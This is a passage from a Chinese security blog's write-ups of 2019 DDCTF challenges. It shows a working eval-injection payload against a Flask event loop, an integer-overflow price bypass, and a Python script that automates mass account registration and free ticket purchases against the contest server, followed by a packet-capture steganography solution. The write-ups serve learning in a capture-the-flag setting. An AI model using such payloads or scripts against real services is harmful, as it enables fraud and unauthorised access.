<p>直接给出<code>payload</code>，然后一步步去分析</p>
<pre><code>?action:trigger_event%23;action:buy;5%23action:get_flag;
</code></pre><ol>
<li><code>entry_point()</code></li>
</ol>
<p>本题是Python的Flask搭建的服务器，网站的入口在函数<code>entry_point()</code>处，因为有<a href="mailto:`@app.route" target="_blank" rel="noopener">`@app.route</a>(url_prefix+’/‘)`，可以看文章前面给的Flask简单入门的文章</p>
<p>这个函数会将<code>问号</code>后面的语句作为字符串传入一个参数中，然后这个参数再传到<code>trigger_event()</code>函数中进行处理</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-2.png" alt="4-2"></p>
<ol start="2">
<li><code>trigger_event()函数</code></li>
</ol>
<p>传入的参数会先保存在<code>session的log</code>数组中，相当于日志功能</p>
<p>然后再拼接到<code>request.event_queue</code>数组中，这是一个队列，可以理解为排队等待服务</p>
<p>也就是说，trigger_event()函数执行完后，我们传入的参数就以<code>字符串</code>的形式，保存在<code>数组</code>当中</p>
<p>此时我们还在entry_point()内，接下去就是调用execute_event_loop()函数了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-3.png" alt="4-3"></p>
<ol start="3">
<li><code>execute_event_loop()函数</code></li>
</ol>
<p>主体为<code>while循环</code>，当前面的<code>request.event_queue数组</code>不为空时，循环执行</p>
<p>具体代码可以自己看，这里就不再赘述，下面直接开始讲漏洞</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-4.png" alt="4-4"></p>
<ol start="4">
<li><code>漏洞部分</code></li>
</ol>
<p>（1）在<code>execute_event_loop()函数</code>中，如下图所示，这里我们可以通过在<code>action</code>字符串后面加井号<code>#</code>，来处理掉后面的代码，此时<code>eval()</code>函数就可控了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-5.png" alt="4-5"></p>
<p>那么为什么要让这个<code>eval()</code>函数可控呢，因为从上图可以看出，如果语句正常执行，必然在字符串后面加上<code>_handler 或者_function</code>，也就是说，如果不破坏规则，我们能执行利用的函数只有后面带有<code>_handler 或者_function</code>的函数，这样的话我们就不能利用<code>trigger_event()</code>这个函数了</p>
<p>（2）观察函数<code>buy_handler()</code>，发现当必要参数传入后，商品会先给我们，然后再通过<code>trigger_event()</code>这个函数将<code>consume_point_function()</code>插入到待服务队列中，而这个函数的作用就是判断我们的钱数够不够买商品，不够的话，将我们账户的钱数和商品数都置为未购买之前的状态（就是退钱退货）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-6.png" alt="4-6"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-7.png" alt="4-7"></p>
<ol start="5">
<li><code>get_flag_handler()函数</code></li>
</ol>
<p>我们将利用这个函数获得flag，<code>当num_items（我们拥有的商品）数量大于5时</code>，调用了<code>trigger_event()</code>这个函数，将<code>show_flag_function()</code>插入到待服务队列中，但是这个函数已经被作者给ban掉了（也就是没有卵用了），但是后面的<code>FLAG()</code>应该是拿出了flag了。还记得前面提到的<code>trigger_event()</code>有日志功能吗，没错，解题关键点就来了：我们想办法执行这个<code>show_flag_function()</code>函数，让flag记录在日志里，再查看日志就可以了</p>
<p>讲到现在，我们再次看一下<code>payload</code>：</p>
<pre><code>?action:trigger_event%23;action:buy;5%23action:get_flag;
</code></pre><p>%23是井号#的编码</p>
<p>编写一个小脚本，看一下我们传入的参数到底是怎样被分割的：</p>
<p>如下图可以看到，服务器会帮我们去执行<code>trigger_event()</code>函数，传入的参数是<code>[&#39;action:buy;5&#39;, &#39;action:get_flag;&#39;]</code>这个队列</p>
<p>执行完后，<code>request.event_queue</code>数组中的内容就是<code>[&#39;action:buy;5&#39;, &#39;action:get_flag;&#39;]</code>，也就是说，这2个动作接下去将执行</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-9.png" alt="4-9"></p>
<p>按照队列的顺序，接下来将处理<code>action:buy;5</code>，那么根据前面对buy函数的分析，会先给我们货（也就是此时我们拥有的商品量为5，可以满足get_flag_handler()函数执行条件了），然后再通过<code>trigger_event()</code>这个函数，将<code>consume_point_function()</code>插入到待服务队列中</p>
<p>执行完后，<code>request.event_queue</code>数组中的内容就是<code>[&#39;action:get_flag;&#39;,&#39;func:consume_point;5&#39;]</code></p>
<p>接下来就是处理<code>action:get_flag</code>，此时我们商品的数量大于5，符合条件，成功调用了<code>trigger_event()</code>这个函数，将<code>show_flag_function()</code>插入到待服务队列中，当然也伴随这<code>FLAG()</code>的执行内容</p>
<p>执行完后，我们就不管了，因为此时flag已经被记录在<code>session[&#39;log&#39;]</code>里了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-10.png" alt="4-10"></p>
<p>有个问题？Session不是应该在服务器端吗，我们看不到，其实并不然，因为：flask并不包含数据库操作的框架，就只能将Session存储在Cookie中，所以我们是可以接触到Session的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-11.png" alt="4-11"></p>
<p>利用<code>Session解密工具</code>，将刚才Burpsuit中，相应包恢复给我们的Session拿去解密，得到flag：</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-12.png" alt="4-12"></p>
<hr>
<h2 id="第五题（欢迎报名DDCTF）"><a href="#第五题（欢迎报名DDCTF）" class="headerlink" title="第五题（欢迎报名DDCTF）"></a>第五题（欢迎报名DDCTF）</h2><hr>
<h2 id="第六题（大吉大利，今晚吃鸡）"><a href="#第六题（大吉大利，今晚吃鸡）" class="headerlink" title="第六题（大吉大利，今晚吃鸡）"></a>第六题（大吉大利，今晚吃鸡）</h2><p>先看提示</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-1.png" alt="6-1"></p>
<p>票价要2000，而我们的余额只有100</p>
<p>注册账号，点击<code>立即购买</code>时用<code>Burpsuits</code>抓包</p>
<p>注意：1.有<code>ticket_price字段</code>，上面就写着2000，但是当修改金额小于1000时，订单无法生成。2. 其中的<code>REVEL_SESSION</code>字段，是go语言中才有的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-2.png" alt="6-2"></p>
<p>先看一下go语言中<code>数字类型以及它们的范围</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-3.png" alt="6-3"></p>
<p>尝试了多种数据类型后，发现是<code>uint32</code>，那么也就说<code>数字范围是：0到4294967295</code></p>
<p>那么我们就将<code>ticket_price字段</code>改为<code>4294967295+1</code>也就是<code>4294967296</code>，此时就发生了溢出，就等于<code>0</code></p>
<p>可以生成订单（注意此时如果购买过2000块的票，要创建一个新账户）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-4.png" alt="6-4"></p>
<p>然后此时返回网页在浏览信息时，就会有一张待支付的票，在<code>余额不减少</code>的情况下，我们获得了一张票</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-5.png" alt="6-5"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-6.png" alt="6-6"></p>
<p>然后输入别人的<code>id</code>和<code>ticket</code>号，可以移除掉对手，当你成为鸡王时（淘汰所有对手），就可以拿到flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-7.png" alt="6-7"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-8.png" alt="6-8"></p>
<p>那么现在思路就是：<code>专门使用一个账号填入其他所有账号的id、ticket</code>，成为鸡王</p>
<p>用手写就太慢了，写个脚本来完成：</p>
<pre><code class="python">import requests,re,time

s = requests.Session()
R_success = R_fail = 0    #注册成功（失败）计数
B_success = B_fail = 0    #买票成功（失败）计数
P_success = P_fail = 0    #支付票成功（失败）计数
List_of_id = []            #存放id的数组
List_of_ticket = []        #存放ticket的数组

password = &#39;123456789&#39;
ticket_price = 4294967296
for i in range(110):
    name = &#39;hsuser&#39;+str(i)
    url1 = &quot;http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s&quot;%(name,password)
    r1 = s.get(url1)
    if &#39;&quot;code&quot;:200&#39; in r1.text:        #注册成功后
        R_success += 1
        url2 = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d&quot;%(ticket_price)
        r2 = s.get(url2)
        #r2.text = {&quot;code&quot;:200,&quot;data&quot;:[{&quot;bill_id&quot;:&quot;2e35623d-bbeb-44b1-9ee9-77ee3ffd291f&quot;,&quot;ticket_price&quot;:4294967296}]}
        if &#39;&quot;code&quot;:200&#39; in r2.text:        #买票成功后
            B_success += 1
            bill_id = re.findall(r&#39;&quot;bill_id&quot;:&quot;(.*)&quot;,&#39;,r2.text)[0]
            url3 = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot;%(bill_id)
            r3 = s.get(url3)
            #r3.text = {&quot;code&quot;:200,&quot;data&quot;:[{&quot;your_id&quot;:144,&quot;your_ticket&quot;:&quot;b017ec750d8b04d1db6cb8bafec4dccb&quot;}]}
            if &#39;&quot;code&quot;:200&#39; in r3.text:        #支付票成功后
                P_success += 1
                your_id = re.findall(r&#39;&quot;your_id&quot;:(.*),&quot;you&#39;,r3.text)[0]
                your_ticket = re.findall(r&#39;&quot;your_ticket&quot;:&quot;(.*)&quot;}]&#39;,r3.text)[0]
                List_of_id.append(your_id)
                List_of_ticket.append(your_ticket)
                time.sleep(0.5)        #引入时间函数是为了停顿，因为太快的话服务器好像会反映不过来
                print(&quot;完成第&quot;+str(i)+&quot;位&quot;)
            else:
                P_fail += 1
        else:
            B_fail += 1
    else:
        R_fail += 1

url4 = &quot;http://117.51.147.155:5050/ctf/api/login?name=hhuser2&amp;password=123456789&quot;
r4 = s.get(url4)    #获得我们&quot;鸡王&quot;的登录Session状态
for i in range(100):        #从列表中一个个取出id和ticket，杀掉它们
    url5 = &quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot;%(List_of_id[i],List_of_ticket[i])
    r5 = s.get(url5)
    print(r5.text)

#以下是对注册、买票、支付票成功与否的一个统计数据，可以做参考
print(&quot;Register success:&quot; + str(R_success))
print(&quot;Register fali:&quot; + str(R_fail))
print(&quot;========================&quot;)
print(&quot;Buy ticket success:&quot; + str(B_success))
print(&quot;Buy ticket fali:&quot; + str(B_fail))
print(&quot;========================&quot;)
print(&quot;Puy ticket success:&quot; + str(P_success))
print(&quot;Puy ticket fali:&quot; + str(P_fail))
print(&quot;========================&quot;)
</code></pre>
<p>实际操作的时候，因为各种原因，要<code>多次提交脚本</code>最终才能让我们的<code>鸡王</code>干掉100个对手，得到flag：</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-9.png" alt="6-9"></p>
<h1 id="2-Misc"><a href="#2-Misc" class="headerlink" title="2. Misc"></a>2. Misc</h1><h2 id="第一题（北京地铁）"><a href="#第一题（北京地铁）" class="headerlink" title="第一题（北京地铁）"></a>第一题（北京地铁）</h2><h2 id="第二题（MulTzor）"><a href="#第二题（MulTzor）" class="headerlink" title="第二题（MulTzor）"></a>第二题（MulTzor）</h2><h2 id="第四题（Wireshark）"><a href="#第四题（Wireshark）" class="headerlink" title="第四题（Wireshark）"></a>第四题（Wireshark）</h2><p><code>tcp.stream eq 1</code></p>
<p>分析第一段TCP流，发现访问了这个网址：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a></p>
<p><img src alt="1-1"></p>
<p>浏览器访问一下，发现是：在线图片添加/解密隐藏信息(隐写术)工具，暂时没什么用，先放着</p>
<p><img src alt="1-2"></p>
<p><code>tcp.stream eq 5</code></p>
<p>继续往下看一直来到第五段TCP流，用户向服务器POST了一张PNG图片，服务器返回200成功</p>
<p><img src alt="1-3"></p>
<p>显示为原始数据</p>
<p>找PNG图片的固定开头格式：0x89 50 4E 47，找到了1处</p>
<p>找PNG图片的固定结尾格式：0xAE 42 60 82，找到了1处</p>
<p><img src alt="1-4"></p>
<p>那原始数据中有一张完整的PNG图片，我们把它复制下来，放到winhex上保存下来，浏览一下这张图片，没什么信息</p>
<p>修改图片高度，再次浏览图片，看到隐藏的内容：key:xS8niJM7</p>
<p><img src alt="1-5"></p>
<p><code>tcp.stream eq 13</code></p>
<p>继续往下看一直来到第十三段TCP流，用户向服务器POST了一张PNG图片，服务器返回200成功</p>
<p><img src alt="1-6"></p>
<p>同样显示为原始数据</p>
<p>找PNG图片的固定开头格式：找到了1处</p>
<p>找PNG图片的固定结尾格式：找到了1处</p>
<p>将这段数据保存下来，生成了另外一张PNG图片</p>
<p><img src alt="1-7"></p>
<p>此时想到第一段TCP流里面的那个网站</p>
<p>将第二张图片放进去，密码填第一张图片给的：xS8niJM7</p>
<p>解出隐藏信息：flag+AHs-44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D+AH0-</p>
<p><img src alt="1-8"></p>
<p>将中间那段16进制转ASCII，解出flag</p>
<p><img src alt="1-9"></p>
<p><code>DDCTF{NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2}</code></p>
<h2 id="第五题（联盟决策大会）"><a href="#第五题（联盟决策大会）" class="headerlink" title="第五题（联盟决策大会）"></a>第五题（联盟决策大会）</h2>
            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/knlvre.github.io/statics/tenyearworld.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/Hacker.ico" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>Notes During Information Security Learning.</span>
                    <dl>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">61 <p>Articles</p></a></li>
                    <li><a href="/categories">0 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-number">2.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Web"><span class="toc-number"></span> <span class="toc-text">1. Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一题（滴-）"><span class="toc-number">1.</span> <span class="toc-text">第一题（滴~）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二题（WEB签到题）"><span class="toc-number">2.</span> <span class="toc-text">第二题（WEB签到题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三题（Upload-IMG）"><span class="toc-number">3.</span> <span class="toc-text">第三题（Upload-IMG）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文章："><span class="toc-number">3.1.</span> <span class="toc-text">参考文章：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四题（homebrew-event-loop）"><span class="toc-number">4.</span> <span class="toc-text">第四题（homebrew event loop）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第五题（欢迎报名DDCTF）"><span class="toc-number">5.</span> <span class="toc-text">第五题（欢迎报名DDCTF）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第六题（大吉大利，今晚吃鸡）"><span class="toc-number">6.</span> <span class="toc-text">第六题（大吉大利，今晚吃鸡）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Misc"><span class="toc-number"></span> <span class="toc-text">2. Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一题（北京地铁）"><span class="toc-number">1.</span> <span class="toc-text">第一题（北京地铁）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二题（MulTzor）"><span class="toc-number">2.</span> <span class="toc-text">第二题（MulTzor）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四题（Wireshark）"><span class="toc-number">3.</span> <span class="toc-text">第四题（Wireshark）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第五题（联盟决策大会）"><span class="toc-number">4.</span> <span class="toc-text">第五题（联盟决策大会）</span></a></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2019
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/knlvre.github.io/js/plugin.js"></script>
<script src="/knlvre.github.io/js/obsidian.js"></script>
<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
<script src="/knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
